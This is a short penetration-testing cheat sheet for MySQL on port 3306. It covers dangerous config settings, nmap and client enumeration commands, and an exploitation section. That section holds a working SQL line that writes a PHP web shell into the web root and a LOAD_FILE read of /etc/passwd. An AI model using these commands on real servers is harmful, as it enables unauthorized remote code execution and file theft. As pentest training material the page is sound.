# MySQL DB - T3306

### Default Configuration <a href="#default-configuration" id="default-configuration"></a>

* `cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r`

### Dangerous Settings <a href="#dangerous-settings" id="dangerous-settings"></a>

* <table data-header-hidden><thead><tr><th width="162.14276123046875">Settings</th><th>Description</th></tr></thead><tbody><tr><td><code>user</code></td><td>Sets which user the MySQL service will run as.</td></tr><tr><td><code>password</code></td><td>Sets the password for the MySQL user.</td></tr><tr><td><code>admin_address</code></td><td>The IP address on which to listen for TCP/IP connections on the administrative network interface.</td></tr><tr><td><code>debug</code></td><td>This variable indicates the current debugging settings</td></tr><tr><td><code>sql_warnings</code></td><td>This variable controls whether single-row INSERT statements produce an information string if warnings occur.</td></tr><tr><td><code>secure_file_priv</code></td><td>This variable is used to limit the effect of data import and export operations.</td></tr></tbody></table>

### Footprinting <a href="#footprinting-the-service" id="footprinting-the-service"></a>

{% tabs %}
{% tab title="Metasploit" %}

{% endtab %}

{% tab title="Nmap" %}
{% code lineNumbers="true" %}
```shellscript
sudo nmap -sV -sC -p3306 --script mysql* <IP>
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Enumeration

{% tabs %}
{% tab title="mysql" %}
[guide](https://dev.mysql.com/doc/mysql-getting-started/en/#mysql-getting-started-installing)

{% code lineNumbers="true" %}
```shellscript
## Linux
mysql -u <username> -p<password> -h <IP> ## no space for password field
## Windows
mysql.exe -u <username> -p<password> -h <IP>
Commands
show databases;, use <database>;, show tables;, show columns from <table>;, select * from <table>;, select * from <table> where <column> = "<string>";
```
{% endcode %}
{% endtab %}

{% tab title="Tab" %}

{% endtab %}
{% endtabs %}

### Exploitation

* #### Write Local Files <a href="#write-local-files" id="write-local-files"></a>
  * <pre class="language-sql" data-line-numbers><code class="lang-sql">-- When 'secure_file_priv' is not set
    show variables like "secure_file_priv";
    SELECT "&#x3C;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    </code></pre>
* #### Read Local Files
  * <pre class="language-sql" data-line-numbers><code class="lang-sql">select LOAD_FILE("/etc/passwd");
    </code></pre>

### Tools

* [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)
* [dbeaver](https://github.com/dbeaver/dbeaver)
* [mycli](https://github.com/dbcli/mycli)
* [lib\_mysqludf\_sys](https://github.com/mysqludf/lib_mysqludf_sys)
